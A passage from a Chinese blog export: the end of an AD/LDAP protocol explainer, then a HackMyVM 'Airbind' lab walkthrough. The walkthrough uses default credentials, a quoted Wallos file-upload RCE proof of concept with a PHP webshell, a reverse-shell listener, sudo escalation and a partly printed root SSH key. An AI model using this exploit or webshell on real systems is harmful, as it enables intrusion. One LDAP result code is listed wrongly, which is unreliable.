<li><p>应用特性<br><strong>名唯一:</strong> 在当前活动目录下不能出现相同的对象名，而且该限制是不区分大小写的。如果拥有一个叫Admin的用户，将不允许出现一个为admin的组。<br><strong>可继承:</strong> 可以继承动态访问权限。通过继承子对象，将自动获取并推迟其父对象的访问权限。如果更改父对象的访问权限，相同的更改将应用于目录树中父对象之下的所有子对象。将资源分组到组织单元之中，通过单个管理操作基于继承来管理资源，从而节省时间。基于继承的管理还提供了前所未有的管理可扩展性。活动目录将网络实体的完全访问权限静态存储在其关联对象的访问控制列表(ACL)中，确保对父对象的访问更改最终应用于所有子对象。如果父对象的权限更改，将为每个子对象重建ACL，一边反映更改。此重建过程需要消耗大量CPU周期和磁盘空间。父对象的权限更改与子对象的ACL重建间存在延迟，因此父对象的访问权限更改不会立即应用于子对象。<br><strong>可复制:</strong> 基于微软的知识一致性检查器(KCC)进行信息复制，KCC是一个在所有域控上运行并且为林生成复制拓扑的内置进程，会根据网络状态和目录服务配置创建单独的复制拓扑。<br><strong>跨平台:</strong> 可以在任何计算机平台上使用LDAP客户端进行访问目录服务，也可以很容易在定制软件上完成LDAP支持。<br><strong>树结构:</strong> 活动目录仅支持OpenLDAP中的树形结构，这样可以更好地体现域内组织架构。</p>
</li>
<li><p>全局编录服务器<br>全局编录服务器(Global Catalog,GC)存储结构和配置目录分区与域控无差别，它本身也是域控，GC只是附加的能力，默认情况下，新林创建的第一个域服务器是GC，此后将新的域控添加到已存在的域中需要指定称为GC。GC存储的是有关整个林中所有域的所有对象信息，而不是仅存储一个活动目录域中的信息。KCC创建复制拓扑，确保每一个活动目录都可以将分区内容传递到林中的每一个GC中。<br>默认情况下会在域中的GC上监听TCP端口3268(或3269用于SSL上的LDAP)。直接使用LDAP客户端连接GC相应端口即可访问全局目录，当使用该端口连接时将只允许只读方式。</p>
</li>
</ol>
<h2 id="通信流程"><a href="#通信流程" class="headerlink" title="通信流程"></a>通信流程</h2><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><ol>
<li>认证<br>使用客户端时，请求方发送<code>bindRequest</code>连接LDAP服务，同时会发送用户名和密码进行认证，特殊情况下也允许匿名访问连接。使用简单密码认证时，密码以明文方式保存。</li>
<li>校验<br>接收方会校验<code>bindRequest</code>凭据的可用性，再通过<code>bindResponse</code>返回登录结果。<br>在这个包中，有<code>resultCode</code>字段:<br>success(0): 认证通过<br>operationsError(1): 服务器遇到内部错误<br>protocolError(2): 无法识别的版本号或不正确的PDU结构<br>authMethodNotSupported(7): 无法识别的SASL机制名称<br>strongAuthRequired(8): 服务器要求使用SASL机制执行身份验证<br>referral(10): 服务器无法接受此绑定，客户端应尝试另一个<br>saslBindInProgress(14): 服务器要求客户端发送新的绑定请求，使用相同的SASL机制，以继续身份验证过程<br>inappropriateAuthentication(48): 服务器要求尝试匿名绑定或不提供凭据的客户端提供某种形式的凭据<br>invalidCredentials(48): 提供了错误的密码或无法处理SASL凭据<br>unavailable(81): 服务器正在关闭</li>
<li>请求<br>当接收方判断登录成功后，根据访问控制请求方进行查询，删除，修改等操作。<br><strong>searchRequest:</strong> 查询方法，对baseObject目录进行过滤<br><strong>modifyRequest:</strong> 修改object里的class属性，operation中包括增删改操作<br><strong>deleteRequest:</strong> 删除object<br><strong>modifyDNRequest:</strong> 移动或重命名该DN</li>
<li>响应<br>搜索的响应结果分为两部分: <code>searchSesEntry</code>和<code>searchResDone</code>。searchSesEntry包含查询的结果信息，searchResDone返回的是查询状态。</li>
</ol>
<h3 id="CLDAP"><a href="#CLDAP" class="headerlink" title="CLDAP"></a>CLDAP</h3><p>CLDAP(Connectionless Lightweight Directory Access Protocol)，是面向无连接的轻量目录访问协议，比LDAP需要的资源更少，因此它使用UDP而不是TCP。</p>
<ol>
<li>请求<br>客户端发起CLDAP请求</li>
<li>响应<br>服务端返回CLDAP响应包，数据包中记录了关于目标服务器的域内信息，主要通过DS_FLAG值体现。</li>
</ol>
]]></content>
      <categories>
        <category>AD域</category>
      </categories>
      <tags>
        <tag>LDAP协议 - windows协议</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Airbind</title>
    <url>/posts/a88f73eb/</url>
    <content><![CDATA[<p><strong>难度:Medium</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.184</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:d2:f8:5d       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.184  08:00:27:42:db:30       PCS Systemtechnik GmbH

<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">1.937</span> seconds <span class="token punctuation">(</span><span class="token number">132.16</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded
</code></pre>
<p>上课上一半，看群里群主又把机子给秒了，这就是人与人之间的差距吗?迫不及待，下课立马打开靶机，做了一通，迅速拿到root但是在虚拟机里面，不知所措的时候，群主发了wp，也是成功拿到root flag，这里复盘记录一下。</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token number">192.168</span>.56.184 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-06-12 <span class="token number">16</span>:20 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.184
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00026s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE    SERVICE VERSION
<span class="token number">22</span>/tcp filtered <span class="token function">ssh</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>     http    Apache httpd <span class="token number">2.4</span>.57 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
<span class="token operator">|</span> http-title: Wallos - Subscription Tracker
<span class="token operator">|</span>_Requested resource was login.php
<span class="token operator">|</span>_http-server-header: Apache/2.4.57 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
<span class="token operator">|</span> http-cookie-flags: 
<span class="token operator">|</span>   /: 
<span class="token operator">|</span>     PHPSESSID: 
<span class="token operator">|</span>_      httponly flag not <span class="token builtin class-name">set</span>
MAC Address: 08:00:27:42:DB:30 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
No exact OS matches <span class="token keyword">for</span> <span class="token function">host</span> <span class="token punctuation">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="token punctuation">)</span>.
TCP/IP fingerprint:
OS:SCAN<span class="token punctuation">(</span>V<span class="token operator">=</span><span class="token number">7</span>.94SVN%E<span class="token operator">=</span><span class="token number">4</span>%D<span class="token operator">=</span><span class="token number">6</span>/12%OT<span class="token operator">=</span><span class="token number">80</span>%CT<span class="token operator">=</span><span class="token number">1</span>%CU<span class="token operator">=</span><span class="token number">40326</span>%PV<span class="token operator">=</span>Y%DS<span class="token operator">=</span><span class="token number">1</span>%DC<span class="token operator">=</span>D%G<span class="token operator">=</span>Y%M<span class="token operator">=</span>08002
OS:7%TM<span class="token operator">=</span>66695A53%P<span class="token operator">=</span>x86_64-pc-linux-gnu<span class="token punctuation">)</span>SEQ<span class="token punctuation">(</span>SP<span class="token operator">=</span>FF%GCD<span class="token operator">=</span><span class="token number">1</span>%ISR<span class="token operator">=</span><span class="token number">100</span>%TI<span class="token operator">=</span>Z%CI<span class="token operator">=</span>Z%II
OS:<span class="token operator">=</span>I%TS<span class="token operator">=</span>A<span class="token punctuation">)</span>SEQ<span class="token punctuation">(</span>SP<span class="token operator">=</span>FF%GCD<span class="token operator">=</span><span class="token number">2</span>%ISR<span class="token operator">=</span><span class="token number">100</span>%TI<span class="token operator">=</span>Z%CI<span class="token operator">=</span>Z%II<span class="token operator">=</span>I%TS<span class="token operator">=</span>A<span class="token punctuation">)</span>OPS<span class="token punctuation">(</span>O1<span class="token operator">=</span>M5B4ST11NW7%O
OS:2<span class="token operator">=</span>M5B4ST11NW7%O3<span class="token operator">=</span>M5B4NNT11NW7%O4<span class="token operator">=</span>M5B4ST11NW7%O5<span class="token operator">=</span>M5B4ST11NW7%O6<span class="token operator">=</span>M5B4ST11<span class="token punctuation">)</span>
OS:WIN<span class="token punctuation">(</span>W1<span class="token operator">=</span>FE88%W2<span class="token operator">=</span>FE88%W3<span class="token operator">=</span>FE88%W4<span class="token operator">=</span>FE88%W5<span class="token operator">=</span>FE88%W6<span class="token operator">=</span>FE88<span class="token punctuation">)</span>ECN<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>3F%W<span class="token operator">=</span>
OS:FAF0%O<span class="token operator">=</span>M5B4NNSNW7%CC<span class="token operator">=</span>Y%Q<span class="token operator">=</span><span class="token punctuation">)</span>T1<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>3F%S<span class="token operator">=</span>O%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AS%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span><span class="token punctuation">)</span>T2<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%
OS:DF<span class="token operator">=</span>Y%T<span class="token operator">=</span><span class="token number">40</span>%W<span class="token operator">=</span><span class="token number">0</span>%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span><span class="token punctuation">)</span>T3<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span><span class="token number">40</span>%W<span class="token operator">=</span><span class="token number">0</span>%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>O%F<span class="token operator">=</span>AR%
OS:O<span class="token operator">=</span>%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span><span class="token punctuation">)</span>T4<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span>3F%W<span class="token operator">=</span><span class="token number">0</span>%S<span class="token operator">=</span>A%A<span class="token operator">=</span>Z%F<span class="token operator">=</span>R%O<span class="token operator">=</span>%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span><span class="token punctuation">)</span>T5<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span><span class="token number">40</span>%
OS:W<span class="token operator">=</span><span class="token number">0</span>%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span><span class="token punctuation">)</span>T6<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span><span class="token number">40</span>%W<span class="token operator">=</span><span class="token number">0</span>%S<span class="token operator">=</span>A%A<span class="token operator">=</span>Z%F<span class="token operator">=</span>R%O<span class="token operator">=</span>%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span>
OS:<span class="token punctuation">)</span>T7<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>Y%T<span class="token operator">=</span><span class="token number">40</span>%W<span class="token operator">=</span><span class="token number">0</span>%S<span class="token operator">=</span>Z%A<span class="token operator">=</span>S+%F<span class="token operator">=</span>AR%O<span class="token operator">=</span>%RD<span class="token operator">=</span><span class="token number">0</span>%Q<span class="token operator">=</span><span class="token punctuation">)</span>U1<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DF<span class="token operator">=</span>N%T<span class="token operator">=</span><span class="token number">40</span>%IPL<span class="token operator">=</span><span class="token number">164</span>%
OS:UN<span class="token operator">=</span><span class="token number">0</span>%RIPL<span class="token operator">=</span>G%RID<span class="token operator">=</span>G%RIPCK<span class="token operator">=</span>G%RUCK<span class="token operator">=</span>G%RUD<span class="token operator">=</span>G<span class="token punctuation">)</span>IE<span class="token punctuation">(</span>R<span class="token operator">=</span>Y%DFI<span class="token operator">=</span>N%T<span class="token operator">=</span><span class="token number">40</span>%CD<span class="token operator">=</span>S<span class="token punctuation">)</span>

Network Distance: <span class="token number">1</span> hop

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.26</span> ms <span class="token number">192.168</span>.56.184

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">17.12</span> seconds</code></pre>
<p>2端口又被过滤了，昨天刚做一个过滤用到的knock敲开<br>先不急，这个后说</p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>打开一看是wallos<br><img src="https://ooo.0x0.ooo/2024/06/12/OJX2bP.png" alt="OJX2bP.png" loading="lazy"><br>直接给了后台<br>弱口令<code>admin</code> <code>admin</code>直接进去<br>进去之后搜了一下漏洞</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> searchsploit  wallos
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                                <span class="token operator">|</span>  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Wallos <span class="token operator">&lt;</span> <span class="token number">1.11</span>.2 - File Upload RCE                                                                                                                                                                             <span class="token operator">|</span> php/webapps/51924.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results</code></pre>
<p>正好有个文件上传漏洞</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> /usr/share/exploitdb/exploits/php/webapps/51924.txt 
<span class="token comment"># Exploit Title: Wallos - File Upload RCE (Authenticated)</span>
<span class="token comment"># Date: 2024-03-04</span>
<span class="token comment"># Exploit Author: sml@lacashita.com</span>
<span class="token comment"># Vendor Homepage: https://github.com/ellite/Wallos</span>
<span class="token comment"># Software Link: https://github.com/ellite/Wallos</span>
<span class="token comment"># Version: &lt; 1.11.2</span>
<span class="token comment"># Tested on: Debian 12</span>

Wallos allows you to upload an image/logo when you create a new subscription.
This can be bypassed to upload a malicious .php file.

POC
---

<span class="token number">1</span><span class="token punctuation">)</span> Log into the application.
<span class="token number">2</span><span class="token punctuation">)</span> Go to <span class="token string">"New Subscription"</span>
<span class="token number">3</span><span class="token punctuation">)</span> Upload Logo and choose your webshell .php
<span class="token number">4</span><span class="token punctuation">)</span> Make the Request changing Content-Type to image/jpeg and adding <span class="token string">"GIF89a"</span>, it should be like:

--- SNIP -----------------

POST /endpoints/subscription/add.php HTTP/1.1

Host: <span class="token number">192.168</span>.1.44

User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>X11<span class="token punctuation">;</span> Linux x86_64<span class="token punctuation">;</span> rv:102.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/102.0

Accept: */*

Accept-Language: en-US,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>

Accept-Encoding: gzip, deflate

Referer: http://192.168.1.44/

Content-Type: multipart/form-data<span class="token punctuation">;</span> <span class="token assign-left variable">boundary</span><span class="token operator">=</span>---------------------------29251442139477260933920738324

Origin: http://192.168.1.44

Content-Length: <span class="token number">7220</span>

Connection: close

Cookie: <span class="token assign-left variable">theme</span><span class="token operator">=</span>light<span class="token punctuation">;</span> <span class="token assign-left variable">language</span><span class="token operator">=</span>en<span class="token punctuation">;</span> <span class="token assign-left variable">PHPSESSID</span><span class="token operator">=</span>6a3e5adc1b74b0f1870bbfceb16cda4b<span class="token punctuation">;</span> <span class="token assign-left variable">theme</span><span class="token operator">=</span>light

-----------------------------29251442139477260933920738324

Content-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"name"</span>

<span class="token builtin class-name">test</span>

-----------------------------29251442139477260933920738324

Content-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"logo"</span><span class="token punctuation">;</span> <span class="token assign-left variable">filename</span><span class="token operator">=</span><span class="token string">"revshell.php"</span>

Content-Type: image/jpeg

GIF89a<span class="token punctuation">;</span>

<span class="token operator">&lt;</span>?php
system<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
?<span class="token operator">></span>

-----------------------------29251442139477260933920738324

Content-Disposition: form-data<span class="token punctuation">;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"logo-url"</span>

----- SNIP -----

<span class="token number">5</span><span class="token punctuation">)</span> You will get the response that your <span class="token function">file</span> was uploaded ok:

<span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token builtin class-name">:</span><span class="token string">"Success"</span>,<span class="token string">"message"</span><span class="token builtin class-name">:</span><span class="token string">"Subscription updated successfully"</span><span class="token punctuation">&#125;</span>


<span class="token number">6</span><span class="token punctuation">)</span> Your <span class="token function">file</span> will be located in:
http://VICTIM_IP/images/uploads/logos/XXXXXX-yourshell.php<span class="token comment">#  </span></code></pre>
<p>简单的加个gif文件头和改一下mm属性<br><img src="https://ooo.0x0.ooo/2024/06/12/OJX6mb.png" alt="OJX6mb.png" loading="lazy"><br>上传成功之后访问<code>http://VICTIM_IP/images/uploads/logos</code>找到上传的文件名<br><img src="https://ooo.0x0.ooo/2024/06/12/OJX8Vl.png" alt="OJX8Vl.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/06/12/OJXuqg.png" alt="OJXuqg.png" loading="lazy">可以看到成功rce<br>反弹shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"> ~/Desktop/airbind                                                                                                                                                                                                        root@kali2  <span class="token number">16</span>:38:21 
<span class="token operator">></span> <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">4567</span>             
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.184<span class="token punctuation">]</span> <span class="token number">34884</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">210</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
www-data@ubuntu:/var/www/html/images/uploads/logos$ <span class="token function">id</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span></code></pre>
<p>习惯地sudo一手</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@ubuntu:/var/www$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> www-data on ubuntu:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin,
    use_pty

User www-data may run the following commands on ubuntu:
    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: ALL</code></pre>
<p>看到这我tm还以为无敌了，没想到还有高手。<br>sudo bash拿到root shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@ubuntu:/var/www$ <span class="token function">sudo</span> <span class="token function">bash</span>
<span class="token function">sudo</span> <span class="token function">bash</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
<p>简单地升级一下shell之后</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@ubuntu:/var/www<span class="token comment"># cd ~</span>
root@ubuntu:~<span class="token comment"># ls -al</span>
total <span class="token number">40</span>
drwx------  <span class="token number">4</span> root root <span class="token number">4096</span> May <span class="token number">21</span> <span class="token number">15</span>:07 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">17</span> root root <span class="token number">4096</span> Jun <span class="token number">12</span> 07:53 <span class="token punctuation">..</span>
lrwxrwxrwx  <span class="token number">1</span> root root    <span class="token number">9</span> Apr  <span class="token number">2</span> <span class="token number">14</span>:09 .bash_history -<span class="token operator">></span> /dev/null
-rw-r--r--  <span class="token number">1</span> root root <span class="token number">3106</span> Oct <span class="token number">17</span>  <span class="token number">2022</span> .bashrc
-rw-------  <span class="token number">1</span> root root   <span class="token number">20</span> May <span class="token number">21</span> <span class="token number">14</span>:49 .lesshst
drwxr-xr-x  <span class="token number">3</span> root root <span class="token number">4096</span> Apr  <span class="token number">1</span> <span class="token number">11</span>:20 .local
-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">161</span> Jul  <span class="token number">9</span>  <span class="token number">2019</span> .profile
-rw-r--r--  <span class="token number">1</span> root root   <span class="token number">66</span> May <span class="token number">21</span> <span class="token number">14</span>:49 .selected_editor
-rw-------  <span class="token number">1</span> root root  <span class="token number">300</span> May <span class="token number">21</span> <span class="token number">15</span>:07 .sqlite_history
drwx------  <span class="token number">2</span> root root <span class="token number">4096</span> Apr  <span class="token number">2</span> <span class="token number">14</span>:42 .ssh
-rw-------  <span class="token number">1</span> root root    <span class="token number">0</span> May <span class="token number">21</span> <span class="token number">15</span>:04 .wpa_cli_history
-rwx------  <span class="token number">1</span> root root   <span class="token number">33</span> Apr  <span class="token number">2</span> <span class="token number">14</span>:11 user.txt</code></pre>
<p>root怎么给的是user flag,天真的我还以为root flag被藏起来，于是乎</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@ubuntu:~<span class="token comment"># find / -name root.txt 2>/dev/null</span>
root@ubuntu:~<span class="token comment"># </span></code></pre>
<p>看了一下ip</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@ubuntu:~<span class="token comment"># ifconfig</span>
eth0: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">416</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">></span>  mtu <span class="token number">1500</span>
        inet <span class="token number">10.0</span>.3.241  netmask <span class="token number">255.255</span>.255.0  broadcast <span class="token number">10.0</span>.3.255
        inet6 fe80::dea1:f7ff:fe82:7613  prefixlen <span class="token number">64</span>  scopeid 0x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>link<span class="token operator">></span>
        ether dc:a1:f7:82:76:13  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>
        RX packets <span class="token number">1871</span>  bytes <span class="token number">163504</span> <span class="token punctuation">(</span><span class="token number">163.5</span> KB<span class="token punctuation">)</span>
        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
        TX packets <span class="token number">1248</span>  bytes <span class="token number">458208</span> <span class="token punctuation">(</span><span class="token number">458.2</span> KB<span class="token punctuation">)</span>
        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span>

lo: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">7</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,LOOPBACK,RUNNING<span class="token operator">></span>  mtu <span class="token number">65536</span>
        inet <span class="token number">127.0</span>.0.1  netmask <span class="token number">255.0</span>.0.0
        inet6 ::1  prefixlen <span class="token number">128</span>  scopeid 0x1<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>host<span class="token operator">></span>
        loop  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Local Loopback<span class="token punctuation">)</span>
        RX packets <span class="token number">26</span>  bytes <span class="token number">2584</span> <span class="token punctuation">(</span><span class="token number">2.5</span> KB<span class="token punctuation">)</span>
        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
        TX packets <span class="token number">26</span>  bytes <span class="token number">2584</span> <span class="token punctuation">(</span><span class="token number">2.5</span> KB<span class="token punctuation">)</span>
        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span>

wlan0: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">409</span><span class="token operator"><span class="token file-descriptor important">9</span>&lt;</span>UP,BROADCAST,MULTICAST<span class="token operator">></span>  mtu <span class="token number">1500</span>
        ether 02:00:00:00:00:00  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>
        RX packets <span class="token number">0</span>  bytes <span class="token number">0</span> <span class="token punctuation">(</span><span class="token number">0.0</span> B<span class="token punctuation">)</span>
        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>
        TX packets <span class="token number">0</span>  bytes <span class="token number">0</span> <span class="token punctuation">(</span><span class="token number">0.0</span> B<span class="token punctuation">)</span>
        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span></code></pre>
<p>原来我不在靶机里面，这就回到前面那个问题了，ssh端口被过滤了如何绕过<br>群主给的方案是ipv6绕过<br>找了几篇文章看了一下<br><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/using-ipv6-to-bypass-security/">https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/using-ipv6-to-bypass-security/</a><br><a href="https://nmap.org/book/firewall-subversion.html">https://nmap.org/book/firewall-subversion.html</a><br>感觉就是过滤了ipv4,然后对于ipv6的安全防范没有考虑到位</p>
<h2 id="ssh-root"><a href="#ssh-root" class="headerlink" title="ssh-root"></a>ssh-root</h2><p>先去看虚拟机里面有没有私钥</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@ubuntu:~<span class="token comment"># cd .ssh</span>
root@ubuntu:~/.ssh<span class="token comment"># ls -al</span>
total <span class="token number">24</span>
drwx------ <span class="token number">2</span> root root <span class="token number">4096</span> Apr  <span class="token number">2</span> <span class="token number">14</span>:42 <span class="token builtin class-name">.</span>
drwx------ <span class="token number">4</span> root root <span class="token number">4096</span> May <span class="token number">21</span> <span class="token number">15</span>:07 <span class="token punctuation">..</span>
-rw------- <span class="token number">1</span> root root <span class="token number">2590</span> Apr  <span class="token number">2</span> <span class="token number">14</span>:34 id_rsa
-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">565</span> Apr  <span class="token number">2</span> <span class="token number">14</span>:34 id_rsa.pub
-rw------- <span class="token number">1</span> root root  <span class="token number">978</span> Apr  <span class="token number">2</span> <span class="token number">14</span>:42 known_hosts
-rw-r--r-- <span class="token number">1</span> root root  <span class="token number">142</span> Apr  <span class="token number">2</span> <span class="token number">14</span>:42 known_hosts.old
root@ubuntu:~/.ssh<span class="token comment"># cat id_rsa</span>
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAzhi8CwvvtsKmKafXglHqWyCTjiy4wSfUkwGlQkJ+flYthTVBAJ/L
GxPkEjSi5G6eBYyME9Pm8xBbacS1Jbr18IYIPYy0fu9j7MXRTpvYTITHIrk3g2oLs+2f+I
